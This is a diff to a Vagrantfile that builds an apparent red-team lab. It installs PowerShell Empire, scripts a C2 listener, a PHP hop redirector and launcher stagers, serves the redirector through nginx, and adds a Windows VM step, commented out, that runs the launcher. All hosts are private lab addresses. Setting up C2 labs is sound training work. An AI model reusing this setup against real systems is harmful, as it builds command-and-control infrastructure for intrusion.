@@ -1,21 +1,82 @@
 $empire = <<SCRIPT
 echo "Empire ..."
+cd /vagrant/
+wget -q https://github.com/PowerShellEmpire/Empire/archive/dev.tar.gz
+tar -xzf dev.tar.gz
+rm dev.tar.gz
 cd /vagrant/Empire-dev/setup/
-echo -e "somekey\n" | ./install.sh
+echo -en "somekey\n" | ./install.sh
 cd ..
-echo -en "listeners\nlist\nexit\ny\n" > cmd.txt
+cat > cmd.txt <<EOF
+listeners
+set Name chat
+set Host http://192.168.33.33:80
+set DefaultLostLimit 0
+set DefaultJitter 1
+run
+usestager hop_php
+set Listener chat
+set OutFile /vagrant/hopper/chat.php
+generate
+back
+set Type hop
+set RedirectTarget chat
+set Host http://192.168.33.22/chat.php
+set DefaultProfile /chat.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+run
+usestager launcher_bat
+set OutFile /vagrant/hopper/launcher.cmd
+set Listener chat1
+generate
+back
+usestager launcher
+set OutFile /vagrant/hopper/launcher.txt
+set Listener chat1
+generate
+main
+exit
+y
+EOF
 ./empire < cmd.txt
 date >> /etc/vagrant_provisioned_at
 SCRIPT
 
 $hopper = <<SCRIPT
 echo "hopper .."
-apt-get install nginx php5-fpm
+apt-get -y install nginx php5-fpm > /dev/null
+
+cat > /etc/nginx/sites-enabled/default <<EOF
+server {
+	listen 80 default_server;
+	root /usr/share/nginx/html;
+	index index.html index.htm;
+	server_name localhost;
+	location / {
+		try_files $uri $uri/ =404;
+	}
+	location ~ \.php$ {
+		fastcgi_pass unix:/var/run/php5-fpm.sock;
+		fastcgi_index index.php;
+		include fastcgi_params;
+	}
+}
+EOF
+service nginx start
+service nginx reload
+service nginx status
 cp /vagrant/hopper/chat.php /usr/share/nginx/html/chat.php
-cp /vagrant/hopper/upload.php /usr/share/nginx/html/upload.php
+#cp /vagrant/hopper/upload.php /usr/share/nginx/html/upload.php
 mkdir -p /var/www/chat
 chown www-data:www-data /var/www/chat
 date >> /etc/vagrant_provisioned_at
+SCRIPT
+
+
+$win = <<SCRIPT
+echo "win .."
+# net use x: \\VBOXSVR\vagrant
+# New-PSDrive –Name “x” –PSProvider FileSystem –Root “\\VBOXSVR\vagrant” –Persist
+# x:\hopper\launcher.cmd
 SCRIPT
 
 
@@ -52,6 +113,7 @@ Vagrant.configure(2) do |config|
       vb.customize ["modifyvm", :id, "--cpus", "1"]
       vb.gui = true
      end
+     config.vm.provision "shell", inline: $win
   end
 
 end
